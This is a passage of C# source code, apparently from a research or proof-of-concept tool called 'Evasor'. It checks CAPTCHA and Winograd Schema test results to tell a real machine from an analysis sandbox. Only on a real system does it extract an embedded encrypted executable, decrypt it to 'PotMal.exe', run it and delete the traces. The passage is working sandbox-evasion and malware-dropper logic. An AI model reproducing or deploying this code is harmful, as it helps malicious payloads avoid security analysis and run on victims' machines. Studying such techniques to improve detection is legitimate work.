                {
                    otpt += "\nReverse Turing Captcha test passed";
                    rtTestPassed = true;
                }
                else
                {
                    otpt += "\nReverse Turing Captcha test failed" + "###############################";
                }
                password = opArr[2];
                otpt += "\nKey = " + opArr[2];
                //Delete
                File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RTPass.txt");
            }
            else if(File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RTFail.txt"))
            {
                otpt += "\nWinograd Schema Challenge failed";
                string text = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RTFail.txt");
                if (text.EndsWith("1"))
                {
                    otpt += "\nReverse Turing Captcha test passed";
                    rtTestPassed = true;
                }
                else
                {
                    otpt += "\nReverse Turing Captcha test failed" + "###############################";
                }

                //Delete
                File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RTFail.txt");
            }
            else
            {
                otpt += "\nThe RT,WSC tests were not performed or canceled" + "###############################";
            }
            otpt += "\n";

            //Decrypting the malware/executable - sampleMalEnc.exe-----------------------------------------------
            if(rtTestPassed && winogradPassed && score >= -2)
            {
                File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RealOrAnalysis.txt", "Real system detected");
                try
                {
                    using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("Evasor.EncPotMal.exe"))
                    {
                        using (FileStream fileStream = new FileStream(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "Evasor.EncPotMal.exe"), FileMode.Create))
                        {
                            for (int i = 0; i < stream.Length; i++)
                            {
                                fileStream.WriteByte((byte)stream.ReadByte());
                            }
                            fileStream.Close();
                        }
                    }
                }
                catch
                {
                    otpt += "\nUnable to extract resource sampleMalEnc.exe" + "###############################";
                }

                //calling Decrypt
                try
                {
                    DecryptFile(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "Evasor.EncPotMal.exe"),
                        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "PotMal.exe"));
                    //Start Mal/exec
                    try
                    {
                        Process RTProc = new Process();
                        ProcessStartInfo RTstartInfo = new ProcessStartInfo();
                        RTstartInfo.FileName = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "PotMal.exe");
                        RTProc.StartInfo = RTstartInfo;
                        RTProc.Start();
                        RTProc.WaitForExit();
                    }
                    catch
                    {
                        otpt += "\nUnable to execute PotMal.exe" + "###############################";
                    }
                    //Delete file
                    //File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Evasor.sampleMalEnc.exe");
                    File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Evasor.EncPotMal.exe");
                }
                catch
                {
                    otpt += "\nUnable to decrypt executable";
                }
            }
            else
            {
                File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RealOrAnalysis.txt", "Analysis system detected");
            }
            

            otpt += "\nFinal score is " + score;

            //Checking final otpt
            //Console.WriteLine(otpt);
            File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Finaloutput.txt", otpt);
        }
    }
}
